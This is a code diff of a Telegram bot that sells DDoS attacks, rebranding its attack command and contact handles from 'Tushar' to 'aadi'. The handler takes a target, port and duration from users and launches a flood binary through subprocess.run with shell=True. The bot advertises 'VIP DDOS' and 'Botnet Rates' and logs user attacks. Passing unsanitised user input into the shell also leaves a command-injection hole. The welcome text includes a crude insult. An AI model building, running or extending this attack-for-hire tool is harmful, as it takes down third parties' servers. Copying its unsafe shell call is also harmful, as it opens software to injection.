@@ -208,7 +208,7 @@ aadi_cooldown = {}
 
 COOLDOWN_TIME =0
 
-# Handler for /Tushar command
+# Handler for /aadi command
 @bot.message_handler(commands=['aadi'])
 def handle_aadi(message):
     user_id = str(message.chat.id)
@@ -217,7 +217,7 @@ def handle_aadi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in aadi_cooldown and (datetime.datetime.now() - aadi_cooldown[user_id]).seconds < 3:
-                response = "You Are On Cooldown . Please Wait 5min Before Running The /Tushar Command Again."
+                response = "You Are On Cooldown . Please Wait 5min Before Running The /aadi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -231,16 +231,16 @@ def handle_aadi(message):
             if time > 181:
                 response = "Error: Time interval must be less than 180."
             else:
-                record_command_logs(user_id, '/Tushar', target, port, time)
+                record_command_logs(user_id, '/aadi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./Tushar {target} {port} {time} 75"
+                full_command = f"./aadi {target} {port} {time} 75"
                 subprocess.run(full_command, shell=True)
                 response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- Target: {target} Port: {port} Port: {time}"
         else:
-            response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /Tushar <target> <port> <time>"  # Updated command syntax
+            response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /aadi <target> <port> <time>"  # Updated command syntax
     else:
-        response = " ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡DM - @Xtreme_Box5 ."
+        response = " ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡DM - @user_x_dead ."
 
     bot.reply_to(message, response)
 
@@ -270,7 +270,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''🤖 Available commands:
-💥 /Tushar : Method For aadi Servers. 
+💥 /aadi : Method For aadi Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
 💥 /plan : Checkout Our Botnet Rates.
@@ -292,7 +292,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''ıllıllı⭐🌟 WELCOME TO VIP DDOS BY TUSHAR 🌟⭐ıllıllı \n {user_name}! \n🄱🄶🄼🄸 🄺🄸 🄶🄰🄽🄳 🄼🄰🅁🄽🄴 🄰🄰 🄶🅈🄴😜\nt.mehttps://t.me/tusharmodzfree
+    response = f'''ıllıllı⭐🌟 WELCOME TO VIP DDOS BY AADI 🌟⭐ıllıllı \n {user_name}! \n🄱🄶🄼🄸 🄺🄸 🄶🄰🄽🄳 🄼🄰🅁🄽🄴 🄰🄰 🄶🅈🄴😜\nt.me/user_x_dead
 🤖Try To Run This Command : /help 
 '''
     bot.reply_to(message, response)
